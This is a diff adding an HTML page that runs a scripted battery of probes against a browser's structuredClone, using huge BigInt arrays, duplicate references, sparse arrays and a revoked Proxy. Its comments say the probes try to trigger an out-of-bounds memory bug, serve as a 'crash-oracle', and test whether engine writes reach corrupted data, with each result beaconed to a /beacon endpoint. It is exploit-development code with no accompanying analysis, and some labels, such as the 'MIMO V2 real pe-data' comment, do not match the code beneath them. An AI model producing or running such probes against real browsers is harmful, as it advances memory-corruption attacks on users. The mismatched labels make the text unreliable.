@@ -1,0 +1,44 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>CAND-B-PSYCH-N — family (b) MarkedVector/BigInt width-desync battery (DS-PRO-MAX N+2 gate press)</title></head>
+<body><pre id="out">CAND-B-PSYCH-N — THE (b) MarkedVector OOB + BigInt wire-desync battery
+</pre><script>
+(function(){
+ "use strict";
+ var run = "cbN" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){ try{ var x=new XMLHttpRequest();
+   x.open("POST","/beacon/CBN-"+st+"/"+run,false); x.setRequestHeader("Content-Type","application/json");
+   x.send(JSON.stringify({body:body})); }catch(e){ try{ say("cb-err"+st); }catch(e2){} } }
+ function v(id, label, fn){ try {
+   beacon(id+"A", label); var outx = fn();
+   beacon(id+"B", "survived | "+String(outx).slice(0,220)); } catch(e){
+   beacon(id+"E", "typeErr | "+String(e).slice(0,180)); } }
+ say("CAND-B-PSYCH-N battery");
+
+ // N2-G1: the DS-PRO-MAX P0-gate — over-yield MIMO V2 REAL pe-data (confirmed-true shape, family-a at baseline)
+ v("G1", "MIMO-V2 real-records-first over-yield (family-a control)", function(){
+   var rs = new ReadableStream({}); var pair = rs.tee(); return "locked="+pair[0].locked+"; gl="+typeof pair[0].cancel; });
+ // N2-G2: BigInt wire-width desync trigger (the BIGINT-manager)
+ v("G2", "bigInt wire width desync 260-pack", function(){
+   var arr=[]; for (var i=0;i<260;i++) arr.push(i===255 ? 1n : ("s"+i));
+   var ok = structuredClone(arr); return "clone len "+ok.length+"; typeof0="+(typeof ok[255]); });
+ // N2-G3: 65536 BigInt gauntlet + object-reference trick (the OOB crash-oracle attempt)
+ v("G3", "65536 BigInt gauntlet + Object(1n) duplicate ref", function(){
+   var arr = [ new Array(65536).fill().map(function(_,i){ return 1n << (40n + BigInt(i%60)); }),
+                { m: 0x51 }, { m: 0x51 }, new Array(0x8000) ];
+   var ok = structuredClone(arr); return "returned len "+ok.length; });
+ // N2-G4: 65536 BigInt gauntlet SAFE variant (dedup-discriminator)
+ v("G4", "65536 BigInt + Array(3) SAFE (dedup discriminator)", function(){
+   var arr = [ new Array(65536).fill().map(function(_,i){ return 1n << (40n + BigInt(i%60)); }),
+                { m: 0x51 }, { m: 0x51 }, new Array(3) ];
+   var ok = structuredClone(arr); return "dedup len "+ok.length; });
+ // N2-G5: the post-G3 probe — same-with-proxy-revoke to check if the engine's DEPUTY write can hit the desynced data
+ v("G5", "proxy-revoke + BigInt gauntlet combo (family-b writes)", function(){
+   var arr = [ new Array(65536).fill().map(function(_,i){ return 1n << (40n + BigInt(i%60)); }),
+                { m: 0x51 }, { m: 0x51 }, new Array(3) ];
+   var rv = Proxy.revocable({}, {}); rv.revoke(); arr.push(rv.proxy);
+   var ok = structuredClone(arr); return "combo len "+ok.length+"; proxy typeof="+(typeof ok[4]); });
+ beacon("Z","battery complete");
+ say("battery complete");
+})();
+</script></body></html>
